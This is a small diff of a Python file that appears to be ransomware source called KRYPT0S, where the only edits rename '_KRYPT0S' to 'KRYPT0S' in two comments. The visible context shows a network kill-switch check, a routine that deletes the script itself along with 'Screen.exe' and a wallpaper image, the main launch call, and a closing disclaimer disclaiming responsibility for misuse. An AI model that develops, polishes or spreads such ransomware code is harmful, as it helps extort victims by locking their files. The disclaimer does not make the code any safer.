@@ -44,7 +44,7 @@ def initial_check_kill():
         except requests.ConnectionError:
             connect_counter += 1
 
-# Attempt to delete _KRYPT0S
+# Attempt to delete KRYPT0S
 def kill_ransomware_file(just_file_flag = 0):
     file_to_del = [os.path.abspath(__file__), "Screen.exe", "wallpaperX324HF.png"]
     
@@ -407,7 +407,7 @@ def main():
     kill_ransomware_file(1)
 
 if __name__ == "__main__":    
-    main() # Launch _KRYPT0S
+    main() # Launch KRYPT0S
 
 # I AM NOT RESPONSIBLE FOR ANY MISDOINGS
 # 
